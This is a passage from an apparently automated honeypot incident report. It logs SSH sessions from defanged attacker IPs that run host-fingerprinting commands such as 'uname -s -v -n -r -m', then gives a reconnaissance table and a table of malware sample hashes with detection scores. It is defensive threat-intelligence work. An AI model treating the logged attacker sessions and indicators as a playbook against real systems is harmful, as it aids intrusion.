- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c2904a3464b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:42 |
| **Last Seen** | 2026-06-25 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:42:25` | `cowrie.session.connect` |
| `2026-06-25 16:42:25` | `cowrie.client.version` |
| `2026-06-25 16:42:25` | `cowrie.client.kex` |
| `2026-06-25 16:42:26` | `cowrie.login.success` |
| `2026-06-25 16:42:26` | `cowrie.session.params` |
| `2026-06-25 16:42:26` | `cowrie.command.input` |
| `2026-06-25 16:42:26` | `cowrie.log.closed` |
| `2026-06-25 16:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2d7ae0366c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:43 |
| **Last Seen** | 2026-06-25 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:43:15` | `cowrie.session.connect` |
| `2026-06-25 16:43:15` | `cowrie.client.version` |
| `2026-06-25 16:43:15` | `cowrie.client.kex` |
| `2026-06-25 16:43:16` | `cowrie.login.success` |
| `2026-06-25 16:43:17` | `cowrie.session.params` |
| `2026-06-25 16:43:17` | `cowrie.command.input` |
| `2026-06-25 16:43:17` | `cowrie.log.closed` |
| `2026-06-25 16:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52095d9b7f00

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:44 |
| **Last Seen** | 2026-06-25 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:44:05` | `cowrie.session.connect` |
| `2026-06-25 16:44:05` | `cowrie.client.version` |
| `2026-06-25 16:44:05` | `cowrie.client.kex` |
| `2026-06-25 16:44:05` | `cowrie.login.success` |
| `2026-06-25 16:44:06` | `cowrie.session.params` |
| `2026-06-25 16:44:06` | `cowrie.command.input` |
| `2026-06-25 16:44:06` | `cowrie.log.closed` |
| `2026-06-25 16:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a83d2cb9e84

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:44 |
| **Last Seen** | 2026-06-25 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:44:56` | `cowrie.session.connect` |
| `2026-06-25 16:44:56` | `cowrie.client.version` |
| `2026-06-25 16:44:56` | `cowrie.client.kex` |
| `2026-06-25 16:44:56` | `cowrie.login.success` |
| `2026-06-25 16:44:57` | `cowrie.session.params` |
| `2026-06-25 16:44:57` | `cowrie.command.input` |
| `2026-06-25 16:44:57` | `cowrie.log.closed` |
| `2026-06-25 16:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65e37c0263b0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:45 |
| **Last Seen** | 2026-06-25 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:45:47` | `cowrie.session.connect` |
| `2026-06-25 16:45:47` | `cowrie.client.version` |
| `2026-06-25 16:45:47` | `cowrie.client.kex` |
| `2026-06-25 16:45:48` | `cowrie.login.success` |
| `2026-06-25 16:45:48` | `cowrie.session.params` |
| `2026-06-25 16:45:48` | `cowrie.command.input` |
| `2026-06-25 16:45:48` | `cowrie.log.closed` |
| `2026-06-25 16:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0bcf0f691f4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 16:46 |
| **Last Seen** | 2026-06-25 16:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:46:10` | `cowrie.session.connect` |
| `2026-06-25 16:46:12` | `cowrie.client.version` |
| `2026-06-25 16:46:12` | `cowrie.client.kex` |
| `2026-06-25 16:46:17` | `cowrie.login.success` |
| `2026-06-25 16:46:21` | `cowrie.session.params` |
| `2026-06-25 16:46:21` | `cowrie.command.input` |
| `2026-06-25 16:46:22` | `cowrie.log.closed` |
| `2026-06-25 16:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0001e3a35283

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:46 |
| **Last Seen** | 2026-06-25 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:46:40` | `cowrie.session.connect` |
| `2026-06-25 16:46:40` | `cowrie.client.version` |
| `2026-06-25 16:46:40` | `cowrie.client.kex` |
| `2026-06-25 16:46:41` | `cowrie.login.success` |
| `2026-06-25 16:46:42` | `cowrie.session.params` |
| `2026-06-25 16:46:42` | `cowrie.command.input` |
| `2026-06-25 16:46:42` | `cowrie.log.closed` |
| `2026-06-25 16:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5e34bda367

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:47 |
| **Last Seen** | 2026-06-25 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:47:35` | `cowrie.session.connect` |
| `2026-06-25 16:47:35` | `cowrie.client.version` |
| `2026-06-25 16:47:35` | `cowrie.client.kex` |
| `2026-06-25 16:47:35` | `cowrie.login.success` |
| `2026-06-25 16:47:36` | `cowrie.session.params` |
| `2026-06-25 16:47:36` | `cowrie.command.input` |
| `2026-06-25 16:47:36` | `cowrie.log.closed` |
| `2026-06-25 16:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2afebb9da4be

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:48 |
| **Last Seen** | 2026-06-25 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:48:29` | `cowrie.session.connect` |
| `2026-06-25 16:48:29` | `cowrie.client.version` |
| `2026-06-25 16:48:29` | `cowrie.client.kex` |
| `2026-06-25 16:48:30` | `cowrie.login.success` |
| `2026-06-25 16:48:30` | `cowrie.session.params` |
| `2026-06-25 16:48:30` | `cowrie.command.input` |
| `2026-06-25 16:48:30` | `cowrie.log.closed` |
| `2026-06-25 16:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96b35a1abaf3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:49 |
| **Last Seen** | 2026-06-25 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:49:19` | `cowrie.session.connect` |
| `2026-06-25 16:49:19` | `cowrie.client.version` |
| `2026-06-25 16:49:19` | `cowrie.client.kex` |
| `2026-06-25 16:49:20` | `cowrie.login.success` |
| `2026-06-25 16:49:20` | `cowrie.session.params` |
| `2026-06-25 16:49:20` | `cowrie.command.input` |
| `2026-06-25 16:49:21` | `cowrie.log.closed` |
| `2026-06-25 16:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b0093813f6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:50 |
| **Last Seen** | 2026-06-25 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:50:09` | `cowrie.session.connect` |
| `2026-06-25 16:50:09` | `cowrie.client.version` |
| `2026-06-25 16:50:09` | `cowrie.client.kex` |
| `2026-06-25 16:50:09` | `cowrie.login.success` |
| `2026-06-25 16:50:10` | `cowrie.session.params` |
| `2026-06-25 16:50:10` | `cowrie.command.input` |
| `2026-06-25 16:50:10` | `cowrie.log.closed` |
| `2026-06-25 16:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54e9fd31dbb2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:51 |
| **Last Seen** | 2026-06-25 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:51:05` | `cowrie.session.connect` |
| `2026-06-25 16:51:05` | `cowrie.client.version` |
| `2026-06-25 16:51:05` | `cowrie.client.kex` |
| `2026-06-25 16:51:06` | `cowrie.login.success` |
| `2026-06-25 16:51:07` | `cowrie.session.params` |
| `2026-06-25 16:51:07` | `cowrie.command.input` |
| `2026-06-25 16:51:07` | `cowrie.log.closed` |
| `2026-06-25 16:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f361d08b3ca7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:51 |
| **Last Seen** | 2026-06-25 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:51:58` | `cowrie.session.connect` |
| `2026-06-25 16:51:58` | `cowrie.client.version` |
| `2026-06-25 16:51:58` | `cowrie.client.kex` |
| `2026-06-25 16:51:58` | `cowrie.login.success` |
| `2026-06-25 16:51:59` | `cowrie.session.params` |
| `2026-06-25 16:51:59` | `cowrie.command.input` |
| `2026-06-25 16:51:59` | `cowrie.log.closed` |
| `2026-06-25 16:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abcd86453131

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:52 |
| **Last Seen** | 2026-06-25 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:52:50` | `cowrie.session.connect` |
| `2026-06-25 16:52:50` | `cowrie.client.version` |
| `2026-06-25 16:52:50` | `cowrie.client.kex` |
| `2026-06-25 16:52:50` | `cowrie.login.success` |
| `2026-06-25 16:52:51` | `cowrie.session.params` |
| `2026-06-25 16:52:51` | `cowrie.command.input` |
| `2026-06-25 16:52:51` | `cowrie.log.closed` |
| `2026-06-25 16:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19bf6ae2ca00

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 16:53 |
| **Last Seen** | 2026-06-25 16:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:53:16` | `cowrie.session.connect` |
| `2026-06-25 16:53:16` | `cowrie.client.version` |
| `2026-06-25 16:53:16` | `cowrie.client.kex` |
| `2026-06-25 16:53:18` | `cowrie.login.success` |
| `2026-06-25 16:53:20` | `cowrie.session.params` |
| `2026-06-25 16:53:20` | `cowrie.command.input` |
| `2026-06-25 16:53:20` | `cowrie.log.closed` |
| `2026-06-25 16:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11ed560d0fec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:53 |
| **Last Seen** | 2026-06-25 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:53:42` | `cowrie.session.connect` |
| `2026-06-25 16:53:42` | `cowrie.client.version` |
| `2026-06-25 16:53:42` | `cowrie.client.kex` |
| `2026-06-25 16:53:42` | `cowrie.login.success` |
| `2026-06-25 16:53:43` | `cowrie.session.params` |
| `2026-06-25 16:53:43` | `cowrie.command.input` |
| `2026-06-25 16:53:43` | `cowrie.log.closed` |
| `2026-06-25 16:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e31217fd9c8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:54 |
| **Last Seen** | 2026-06-25 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:54:34` | `cowrie.session.connect` |
| `2026-06-25 16:54:34` | `cowrie.client.version` |
| `2026-06-25 16:54:34` | `cowrie.client.kex` |
| `2026-06-25 16:54:34` | `cowrie.login.success` |
| `2026-06-25 16:54:35` | `cowrie.session.params` |
| `2026-06-25 16:54:35` | `cowrie.command.input` |
| `2026-06-25 16:54:35` | `cowrie.log.closed` |
| `2026-06-25 16:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `209.99.185[.]59` | **261** | 2026-06-25 12:55 | 2026-06-25 16:54 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `139.19.117[.]129` | **4** | 2026-06-25 13:02 | 2026-06-25 16:00 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.125[.]156` | **2** | 2026-06-25 16:23 | 2026-06-25 16:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]108` | **2** | 2026-06-25 13:00 | 2026-06-25 13:00 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `141.11.88[.]108` | **2** | 2026-06-25 15:56 | 2026-06-25 15:56 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `159.65.233[.]253` | **2** | 2026-06-25 14:22 | 2026-06-25 14:52 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]86` | **2** | 2026-06-25 14:33 | 2026-06-25 14:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.118.201[.]169` | **2** | 2026-06-25 16:18 | 2026-06-25 16:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | **2** | 2026-06-25 15:05 | 2026-06-25 15:35 | 1m | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | **2** | 2026-06-25 15:39 | 2026-06-25 15:41 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-06-25 16:20 | 2026-06-25 16:20 | 5s | 0 | `T1592` | 🟢 LOW |
| `141.98.83[.]111` | 1 | 2026-06-25 16:36 | 2026-06-25 16:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.65.139[.]99` | 1 | 2026-06-25 13:31 | 2026-06-25 13:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | 1 | 2026-06-25 14:50 | 2026-06-25 14:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]82` | 1 | 2026-06-25 13:56 | 2026-06-25 13:56 | 2s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]62` | 1 | 2026-06-25 16:46 | 2026-06-25 16:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.27.202[.]178` | 1 | 2026-06-25 15:10 | 2026-06-25 15:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.249.193[.]242` | 1 | 2026-06-25 14:00 | 2026-06-25 14:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-06-25 14:35 | 2026-06-25 14:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-06-25 14:38 | 2026-06-25 14:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-06-25 13:36 | 2026-06-25 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | 1 | 2026-06-25 14:47 | 2026-06-25 14:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]108` | 1 | 2026-06-25 12:56 | 2026-06-25 12:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]21` | 1 | 2026-06-25 12:56 | 2026-06-25 12:56 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (47 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 61/100 | 🟡 MEDIUM | **3/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 45/100 | 🟡 MEDIUM | **13/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 40/100 | 🟡 MEDIUM | **1/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 44/100 | 🟡 MEDIUM | **11/75** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 46/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 45/100 | 🟡 MEDIUM | **14/75** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 45/100 | 🟡 MEDIUM | **14/75** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 42/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 41/100 | 🟡 MEDIUM | **4/75** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
